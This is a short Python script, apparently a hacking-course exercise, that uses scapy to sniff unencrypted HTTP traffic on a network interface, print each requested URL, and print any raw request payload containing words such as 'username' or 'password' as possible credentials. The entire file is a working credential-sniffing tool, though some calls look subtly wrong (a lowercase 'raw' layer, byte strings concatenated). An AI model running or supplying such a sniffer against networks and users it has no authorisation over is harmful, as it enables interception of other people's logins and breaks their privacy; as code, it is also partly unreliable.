#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def geturl(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
    if packet.haslayer(scapy.raw):
        load = str(packet[scapy.raw].load)
        keywords = ["username", "user", "login", "password", "pass"]
        for keyword in keywords:
            if keyword in load:
                return load

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = geturl(packet)
        print(url)
        print("[+] HTTP Request >>" + str(url))

        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username/password > " + str(login_info) + "\n\n")


sniff("eth0")
